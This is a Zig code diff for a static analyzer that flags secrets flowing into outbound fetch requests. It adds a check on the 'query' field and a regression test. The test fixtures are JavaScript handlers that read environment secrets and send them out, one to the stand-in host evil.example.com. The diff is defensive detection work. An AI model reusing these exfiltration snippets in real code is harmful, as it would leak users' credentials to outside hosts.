@@ -1173,6 +1173,14 @@ pub const FlowChecker = struct {
                     self.recordValidated(defended_tag, opts_arg, node, "an egress request body");
                 }
             }
+
+            // The `query` init field is appended to the egress URL at runtime
+            // (buildFetchUrl / appendServiceQuery), so a secret or credential in
+            // it is a URL sink, not a body sink. inferObjectBodyLabels returns
+            // only the `body` value when a body key is present, so without this
+            // the query would escape every sink check and falsely discharge
+            // no_secret_leakage.
+            self.checkSinkLabels(self.inferObjectPropLabels(opts_arg, "query"), node, .egress_url);
         }
     }
 
@@ -1407,6 +1415,23 @@ pub const FlowChecker = struct {
         }
         // If not an object literal, infer labels of the whole thing
         return self.inferLabels(node);
+    }
+
+    /// Labels of a named property's value in an object literal, or empty when the
+    /// node is not an object literal or has no such property.
+    fn inferObjectPropLabels(self: *FlowChecker, node: NodeIndex, key: []const u8) LabelSet {
+        const tag = self.ir_view.getTag(node) orelse return LabelSet.empty;
+        if (tag != .object_literal) return LabelSet.empty;
+        const obj = self.ir_view.getObject(node) orelse return LabelSet.empty;
+        var i: u16 = 0;
+        while (i < obj.properties_count) : (i += 1) {
+            const prop_idx = self.ir_view.getListIndex(obj.properties_start, i);
+            if ((self.ir_view.getTag(prop_idx) orelse continue) != .object_property) continue;
+            const prop = self.ir_view.getProperty(prop_idx) orelse continue;
+            const key_name = self.getPropertyKeyName(prop.key) orelse continue;
+            if (std.mem.eql(u8, key_name, key)) return self.inferLabels(prop.value);
+        }
+        return LabelSet.empty;
     }
 
     /// Get the name of an object property key (identifier or string literal).
@@ -2176,6 +2201,40 @@ test "FlowChecker flags a secret reaching a module fetch body" {
         \\function handler(req) {
         \\  const secret = env("DB_PASSWORD");
         \\  fetch("https://evil.example.com", { method: "POST", body: secret });
+        \\  return Response.json({ ok: true });
+        \\}
+    ;
+
+    var parser = @import("parser/parse.zig").Parser.init(allocator, source);
+    var atoms = context.AtomTable.init(allocator);
+    defer atoms.deinit();
+    parser.setAtomTable(&atoms);
+    defer parser.deinit();
+    const root = try parser.parse();
+    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);
+    const handler_verifier = @import("handler_verifier.zig");
+    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
+        return error.HandlerNotFound;
+
+    var checker = FlowChecker.init(allocator, ir_view, &atoms);
+    defer checker.deinit();
+    _ = try checker.check(handler_fn);
+
+    try std.testing.expect(!checker.getProperties().no_secret_leakage);
+}
+
+test "FlowChecker flags a secret reaching a module fetch query field" {
+    // Regression: the new `query` init field is appended to the egress URL at
+    // runtime, but inferObjectBodyLabels returned only the `body` value when a
+    // body key was present, so a secret in `query` escaped every sink check and
+    // no_secret_leakage was falsely proven and signed into the attestation.
+    const allocator = std.testing.allocator;
+    const source =
+        \\import { fetch } from "zigttp:fetch";
+        \\import { env } from "zigttp:env";
+        \\function handler(req) {
+        \\  const secret = env("UPSTREAM_KEY");
+        \\  fetch("https://api.example.com/v1", { method: "POST", body: "hello", query: { key: secret } });
         \\  return Response.json({ ok: true });
         \\}
     ;
